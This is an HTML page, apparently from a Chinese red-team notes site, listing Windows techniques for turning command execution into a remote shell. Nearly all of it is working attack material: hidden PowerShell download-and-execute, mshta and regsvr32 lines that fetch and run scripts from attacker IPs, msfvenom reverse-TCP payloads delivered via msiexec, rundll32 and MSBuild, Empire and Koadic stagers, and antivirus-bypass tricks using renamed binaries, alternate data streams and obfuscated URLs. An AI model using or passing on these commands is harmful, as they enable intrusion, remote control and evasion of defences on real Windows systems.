@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>在命令执行的情况下上线的几种方式 Windows - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "title: \u5728\u547d\u4ee4\u6267\u884c\u7684\u60c5\u51b5\u4e0b\u4e0a\u7ebf\u7684\u51e0\u79cd\u65b9\u5f0f-Windows date: 2021-01-13 08:49:37", url: "#_top", children: [
+          ]},
+          {title: "\u8fdc\u7a0b\u6267\u884c", url: "#_1", children: [
+              {title: "Powershell", url: "#powershell" },
+              {title: "mshta\u65b9\u5f0f", url: "#mshta" },
+              {title: "msiexec\u65b9\u5f0f", url: "#msiexec" },
+              {title: "regsvr32\u65b9\u5f0f", url: "#regsvr32" },
+              {title: "rundll32\u65b9\u5f0f", url: "#rundll32" },
+              {title: "SCT\u6587\u4ef6\u76f4\u63a5\u5229\u7528", url: "#sct_1" },
+              {title: "WMIC\u5229\u7528xsl\u65b9\u5f0f", url: "#wmicxsl" },
+          ]},
+          {title: "\u672c\u5730\u6267\u884c", url: "#_4", children: [
+              {title: "MSbuild.exe\u5229\u7528", url: "#msbuildexe" },
+              {title: "INF\u6587\u4ef6\u5229\u7528", url: "#inf" },
+          ]},
+          {title: "\u4ee5\u4e0a", url: "#_5", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%9F%9F%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%9F%9F%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        域渗透
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-link">
+        trustedsec BOF插件说明文档
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <hr />
+<h2 id="title-windows-date-2021-01-13-084937">title: 在命令执行的情况下上线的几种方式-Windows date: 2021-01-13 08:49:37</h2>
+<hr />
+<h2 id="_1">远程执行</h2>
+<h3 id="powershell">Powershell</h3>
+<h4 id="base64">远程下载执行+base64</h4>
+<p>下载并base64</p>
+<pre><code class="language-text-plain">$fileContent = &quot;(new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'&quot;
+$bytes  = [System.Text.Encoding]::Unicode.GetBytes($fileContent);
+$encoded = [System.Convert]::ToBase64String($bytes); 
+$encoded
+</code></pre>
+<p>执行</p>
+<p>powershell -WindowStyle Hidden -enc base64</p>
+<h3 id="mshta">mshta方式</h3>
+<pre><code class="language-text-plain">执行vb
+    &gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)
+
+Js
+    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);}
+
+Jsrat
+    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);}
+</code></pre>
+<h4 id="metaspolit">metaspolit模块</h4>
+<pre><code class="language-text-plain">use exploit/windows/misc/hta_server
+mshta xxx
+执行mshta xxxxx
+</code></pre>
+<h4 id="cactustorch">配合CACTUSTORCH</h4>
+<pre><code class="language-text-plain">下载 https://github.com/mdsecactivebreach/CACTUSTORCH
+生成raw格式的shellcode并base64
+    base64从文件快速编码命令：cat 1.bin |base64 -w 0
+修改CACTUSTORCH.hta文件中Dim code处的内容为base64后的shellcode
+执行mshta http://x.x.x.x/CACTUSTORCH.hta
+</code></pre>
+<h4 id="greatsct">配合GreatSCT</h4>
+<pre><code class="language-text-plain">use Bypass
+use mshta/shellcode_inject/base64_migrate
+</code></pre>
+<h3 id="msiexec">msiexec方式</h3>
+<p>可以将msi后缀改为png</p>
+<h4 id="metaspolit_1">metaspolit模块</h4>
+<pre><code class="language-text-plain">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 –f msi &gt; shell.msi
+msiexec /q /i http://x.x.x.x/shell.msi
+</code></pre>
+<h4 id="msi">自编译msi</h4>
+<p>修改恶意msi.wix文件中要执行的命令</p>
+<pre><code class="language-text-plain">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;
+  &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product 
+Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;
+    &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;
+    &lt;Media Id=&quot;1&quot; /&gt;
+    &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;
+      &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;
+        &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;
+          &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;     
+          &lt;/Component&gt;
+        &lt;/Directory&gt;
+      &lt;/Directory&gt;
+    &lt;/Directory&gt;
+    &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;
+      &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;
+    &lt;/Feature&gt;
+    &lt;Property Id=&quot;cmdline&quot;&gt;calc
+    &lt;/Property&gt;
+    &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; 
+ExeCommand='[cmdline]' Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt;
+    &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;
+      invalid vbs to fail install
+    &lt;/CustomAction&gt;
+    &lt;InstallExecuteSequence&gt;
+      &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;
+      &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;
+    &lt;/InstallExecuteSequence&gt;
+  &lt;/Product&gt;
+&lt;/Wix&gt;
+</code></pre>
+<p>使用wix工具编译生成msi</p>
+<pre><code class="language-text-plain">candle.exe msi.wix
+light.exe xxx.wixobj
+</code></pre>
+<h4 id="exemsi">exe转msi</h4>
+<p>使用exe2msi.msi工具将exe转为msi</p>
+<p>如果exe是免杀的，那么这样一来就可以无需exe落地就能远程执行</p>
+<h3 id="regsvr32">regsvr32方式</h3>
+<h4 id="metaspolit_2">配合metaspolit模块</h4>
+<pre><code class="language-text-plain">use exploit/multi/script/web_delivery
+regsvr32 /s /n /u /i:http://x.x.x.x/file.sct scrobj.dll
+</code></pre>
+<h4 id="empire">配合empire</h4>
+<pre><code class="language-text-plain">uselistner http         #开启监听
+set Host http://192.168.1.109 #设置监听地址
+execute     #运行监听
+usestager windows/launcher_sct  #选择模块
+set listener http   #选择监听
+execute     #运行模块
+regsvr /s /n /u /i:http://192.168.1.109:8080/tmp/launcher.sct scrobj.dll
+</code></pre>
+<h4 id="sct">自定义SCT文件</h4>
+<pre><code class="language-text-plain">&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration 
+    progid=&quot;PoC&quot;
+    classid=&quot;{F0001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;
+    &lt;!--  License: BSD3-Clause --&gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+
+            var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;); 
+
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<p>执行：regsvr32 /u /n /s /i:http://192.168.1.109/1.sct scrobj.dll</p>
+<h4 id="koadic">配合koadic</h4>
+<pre><code class="language-text-plain">use stager/js/regsvr
+set srvhost 192.168.1.107
+run
+regsvr32 /u /n /s /i:http;//192.168.1.107:9998/uWBjv scrobj.dll
+zombies 0
+</code></pre>
+<h4 id="jsrat">配合JSRat</h4>
+<p>下载https://github.com/Hood3dRob1n/JSRat-Py</p>
+<p>在本机执行./JSRat.py -I 0.0.0.0 -p 9999后，脚本会自动生成命令</p>
+<pre><code class="language-text-plain">JSRat Server - Python Implementation
+By: Hood3dRob1n
+
+[*] Web Server Started on Port: 9999
+[*] Awaiting Client Connection to:
+   [*] rundll32 invocation: http://0.0.0.0:9999/connect
+   [*] regsvr32 invocation: http://0.0.0.0:9999/file.sct
+      [*] Client Command at: http://0.0.0.0:9999/wtf
+      [*] Browser Hook Set at: http://0.0.0.0:9999/hook
+
+[-] Hit CTRL+C to Stop the Server at any time...
+
+</code></pre>
+<h4 id="greatsct_1">配合GreatSCT</h4>
+<pre><code class="language-text-plain">use Bypass
+use regsvr/shellcode_iject/base64_migrate.py
+generate
+</code></pre>
+<h4 id="bypass">Bypass的一些方式</h4>
+<h5 id="eybfaq">eyb和faq后缀绕过</h5>
+<pre><code class="language-text-plain">copy c:\windows\system32\regsvr32.exe aa.eyb
+copy c:\windows\system32\scrobj.dll aa.faq
+aa.eyb /s /i:http://127.0.0.1:8000/1.sct aa.faq
+</code></pre>
+<h5 id="_2">使用命令绕过</h5>
+<pre><code class="language-text-plain">字符干扰
+regsvr32 /u /n /s /i:h^t^t^p://192.168.122.1/2021.sct scrobj.dll
+regsvr32 /u /n /s /i:h&quot;t&quot;t&quot;p://192.168.122.1/2021.sct scrobj.dll
+
+文件复制
+可以复制两个一起用
+copy c:\windows\system32\regsvr32.exe  C:\Users\Administrator\Desktop\alc.ac
+regs.exe /u /n /s /i:http://192.168.122.1/2021.sct scrobj.dll
+copy c:\windows\system32\scrobj.dll newscrobj.dll
+regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct newscrobj.dll
+
+符号链接，需要链接的dll目录下进行
+Mklink.exe c:\programdata\Myscrobj.dll c:\windows\\scrobj.dll
+regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct Myscrobj.dll
+
+数据流（ADS）
+type c:\windows\system32\scrobj.dll &gt; test.txt:new1.dll
+regsvr32 /u /n /s /i:http://192.168.122.1/2021.sct test.txt:new1.dll
+
+本地运行
+bitsadmin /transfer download /download /priority normal http://192.168.122.1/2021.sct %TEMP%\new2021.txt &amp;&amp; regsvr32.exe /s /u /i:%TEMP%\new2021.txt scrobj.dll
+</code></pre>
+<h5 id="_3">远程调用本地加载</h5>
+<pre><code class="language-text-plain">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tchar.h&gt;
+
+int main()
+{
+    TCHAR *dllpath = _T(&quot;c:\\windows\\system32\\scrobj.dll&quot;);
+    HMODULE hDllScr = LoadLibrary(dllpath);
+    if (hDllScr == NULL)
+    {
+        puts(&quot;Load scrobj.dll fail!&quot;);
+    }
+    puts(&quot;Load scrobj.dll success!&quot;);
+    printf(&quot;Address: %p\n&quot;, hDllScr);
+    void* DllInstallProcAddr = (void*)GetProcAddress(hDllScr, &quot;DllInstall&quot;);
+    if (DllInstallProcAddr == NULL)
+    {
+        puts(&quot;Can not found DllInstall in scrobj.dll!&quot;);
+    }
+    printf(&quot;Found Dllinstall(%p) in scrobj.dll!&quot;, DllInstallProcAddr);
+    ((void (*)(BOOL, TCHAR*))DllInstallProcAddr)(FALSE, L&quot;http://127.0.0.1/ttt.txt&quot;);
+    return 0;
+}
+</code></pre>
+<p>远程调用的文件</p>
+<pre><code class="language-text-plain">&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;component id=&quot;TESTING&quot;&gt;
+&lt;registration
+  progid=&quot;TESTING&quot;
+  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
+
+  &lt;script language=&quot;JScript&quot;&gt;
+    &lt;![CDATA[
+      var wsc = &quot;WScript.Shell&quot;;
+      var com = &quot;calc.exe&quot;;
+      var foo = new ActiveXObject(wsc).Run(com);
+    ]]&gt;
+&lt;/script&gt;
+
+&lt;/registration&gt;
+&lt;/component&gt;
+</code></pre>
+<h3 id="rundll32">rundll32方式</h3>
+<h4 id="metaspolit_3">metaspolit模块</h4>
+<pre><code class="language-text-plain">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f dll &gt; 1.dll
+use exploit/windows/smb/smb_delivery
+rundll32.exe \\192.168.1.107\ZtmW\test.dll,0
+</code></pre>
+<h4 id="koadic_1">配合Koadic</h4>
+<pre><code class="language-text-plain">use stager/js/rundll32_js
+set SRVHOST 192.168.1.107
+run
+</code></pre>
+<h3 id="sct_1">SCT文件直接利用</h3>
+<h4 id="pubprnvbssct">pubprn.vbs结合SCT文件利用</h4>
+<p>windows7下未成功</p>
+<pre><code class="language-text-plain">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://10.100.18.20:8000/1.sct
+</code></pre>
+<h4 id="empire_1">配合empire</h4>
+<pre><code class="language-text-plain">listeners
+uselistener http
+set Host 192.168.1.109
+execute
+usestager windows/launcher_sct
+set Listener HTTP
+execute
+</code></pre>
+<h3 id="wmicxsl">WMIC利用xsl方式</h3>
+<h4 id="koadic_2">配合koadic</h4>
+<pre><code class="language-text-plain">https://github.com/zerosum0x0/koadic
+use stager/js/wmic
+set SRVHOST 192.168.1.107
+run
+wmic os get /FORMAT:&quot;http://192.168.1.109/payload.xsl&quot;
+</code></pre>
+<h4 id="xsl">自定义xsl</h4>
+<pre><code class="language-text-plain">&lt;?xml version='1.0'?&gt;
+&lt;stylesheet
+xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;
+xmlns:user=&quot;placeholder&quot;
+version=&quot;1.0&quot;&gt;
+&lt;output method=&quot;text&quot;/&gt;
+    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;
+    &lt;![CDATA[
+    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);
+    ]]&gt; &lt;/ms:script&gt;
+&lt;/stylesheet&gt;
+</code></pre>
+<h2 id="_4">本地执行</h2>
+<p>一般而言，本地执行的BypassAV的能力都比远程强，缺点就是文件落地难。</p>
+<h3 id="msbuildexe">MSbuild.exe利用</h3>
+<pre><code class="language-text-plain">msfvenom -p windows/meterpreter/reverse_tcp lhost=45.76.107.177 lport=6677 -f csharp
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  exp.csproj  （改为XML格式也可）
+</code></pre>
+<h3 id="inf">INF文件利用</h3>
+<h4 id="cmstpexe">配合cmstp.exe</h4>
+<p>依靠加载远程sct文件利用</p>
+<p>新建一个inf，在代码处填入恶意sct文件。</p>
+<p>然后运行cmstp.exe /s shell.inf</p>
+<pre><code class="language-text-plain">[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct
+
+[Strings]
+AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;
+ServiceName=&quot;Yay&quot;
+ShortSvcName=&quot;Yay&quot;
+</code></pre>
+<h4 id="infdefaultinstallexe">配合InfDefaultInstall.exe</h4>
+<p>运行InfDefaultInstall.exe shady.inf</p>
+<h2 id="_5">以上</h2>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%9F%9F%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%9F%9F%E6%B8%97%E9%80%8F/" class="btn btn-xs btn-link">
+        域渗透
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-link">
+        trustedsec BOF插件说明文档
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
